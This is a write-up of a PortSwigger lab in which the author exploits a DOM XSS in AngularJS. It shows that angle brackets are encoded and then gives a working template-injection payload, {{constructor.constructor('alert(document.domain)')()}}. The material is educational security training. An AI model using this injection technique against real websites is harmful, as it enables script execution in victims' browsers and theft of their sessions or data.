# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression), you'll learn: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in a [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that executes an AngularJS expression and calls the `alert` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230054630.png)

In here, we can see there is a search box.

**Let's search something:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230054649.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230054701.png)

As you can see, our input is reflected to the web page.

**View source page:**
```html
<script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
<script type="text/javascript" src="[/resources/js/angular_1-7-7.js](https://0a8e004c03d8b169c3a2c4e80031004c.web-security-academy.net/resources/js/angular_1-7-7.js)"></script>
    <title>DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</title>
</head>
<body ng-app>
```

In here, we see the **AngularJS JavaScript library is being used, and the `<body>` tag is in `ng-app` directive.**

**Let's try to inject some JavaScript code:**
```html
<script>alert(document.domain)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230054921.png)

**View source page:**
```html
<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;alert(document.domain)&lt;/script&gt;'</h1>
    <hr>
</section>
```

As you can see, the `<>` is HTML encoded.

**However, since AngularJS is being used, we can execute JavaScript expressions within double curly braces:** (From [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md#storedreflected-xss---simple-alert-in-angularjs))
```js
{{constructor.constructor('alert(document.domain)')()}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230055646.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230055653.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-11/images/Pasted%20image%2020221230055709.png)

We did it!

# What we've learned:

1. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded